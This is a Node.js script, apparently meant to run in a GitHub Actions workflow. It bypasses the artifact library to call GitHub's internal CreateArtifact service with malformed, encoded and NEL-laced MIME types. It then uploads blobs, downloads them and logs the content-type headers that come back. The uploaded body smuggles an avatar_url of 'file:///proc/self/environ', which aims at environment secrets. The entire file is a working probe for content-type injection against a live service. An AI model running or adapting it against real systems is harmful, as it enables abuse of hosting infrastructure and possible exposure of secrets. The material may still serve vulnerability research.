import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {getRuntimeToken, getResultsServiceUrl} from '../node_modules/@actions/artifact/lib/internal/shared/config.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const body=Buffer.from(JSON.stringify({full_name:`${repo}/x`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'enc',stargazers_count:0}));
const sha=b=>createHash('sha256').update(b).digest('hex');

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const mod=target.protocol==='https:'?https:http;
    const r=mod.request(target,{method,headers,timeout:20000},res=>{const chunks=[];res.on('data',c=>chunks.push(c));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));});
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();
  });
}
async function upload(url,bytes,ct){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}
async function rawCreate(extra,name){
  const url=new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', getResultsServiceUrl()).href;
  const payload=JSON.stringify({workflow_run_backend_id:ids.workflowRunBackendId, workflow_job_run_backend_id:ids.workflowJobRunBackendId, name, ...extra});
  const r=await req(url,'POST',Buffer.from(payload),{Authorization:`Bearer ${getRuntimeToken()}`,'Content-Type':'application/json'});
  let j=null;try{j=JSON.parse(r.body.toString())}catch{}
  return {status:r.status,body:j};
}

const cases=[
 ['enc-slash','application%2Fjson'],
 ['enc-nel-lead','%85application%2Fjson'],
 ['enc-nel-trail','application%2Fjson%85'],
 ['raw-nel-trail','application/json%85'],
 ['enc-lower','application%2fjson'],
 ['enc-param','application%2Fjson%3Bcharset=utf-8'],
 ['sp-enc',' application%2Fjson'],
 ['enc-sp-lead','%20application%2Fjson'],
 ['enc-sp-trail','application%2Fjson%20'],
 ['nel-enc-lead','\u0085application%2Fjson'],
 ['enc-nel-real','application%2Fjson\u0085'],
 ['upper','APPLICATION/JSON'],
 ['param','application/json;charset=utf-8'],
 ['textxml','text/xml'],
 ['xzip','application/x-zip-compressed'],
 ['jpg','image/jpg'],
 ['nel-lead-upper','\u0085APPLICATION/JSON'],
 ['enc-nel-lead-full','%C2%85application%2Fjson'],
];

for(const [label,mime] of cases){
  const name=`enccarrier-${runId}-${label}`;
  const rec={label,mimeHex:Buffer.from(mime,'utf8').toString('hex')};
  try{
    const r=await rawCreate({version:7,mime_type:mime},name);
    rec.createStatus=r.status;rec.createBody=r.body && {code:r.body.code,msg:r.body.msg,ok:r.body.ok,url:r.body.signed_upload_url?'yes':undefined};
    if(r.status===200&&r.body&&r.body.ok&&r.body.signed_upload_url){
      await upload(r.body.signed_upload_url,body,odd);
      const fin=await client.FinalizeArtifact({...ids,name,size:String(body.length),hash:StringValue.create({value:`sha256:${sha(body)}`})});
      rec.fin=!!fin.ok;
      if(fin.ok){
        const id=String(fin.artifactId);rec.id=id;
        const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'enc-probe'});
        rec.rest=api.status;
        if(api.headers.location){
          const u=new URL(api.headers.location);
          rec.rsct=u.searchParams.get('rsct');
          rec.rawRsct=u.search.split('rsct=')[1]?.split('&')[0];
          const f=await req(api.headers.location);
          rec.finalStatus=f.status;
          rec.finalCtHex=f.headers['content-type']?Buffer.from(f.headers['content-type'],'latin1').toString('hex'):null;
          rec.ctCount=f.rawHeaders.reduce((n,v,i)=>i%2===0&&String(v).toLowerCase()==='content-type'?n+1:n,0);
        }
      }
    }
  }catch(e){rec.err=String(e.message).slice(0,200);}
  console.log('ENC',JSON.stringify(rec));
}
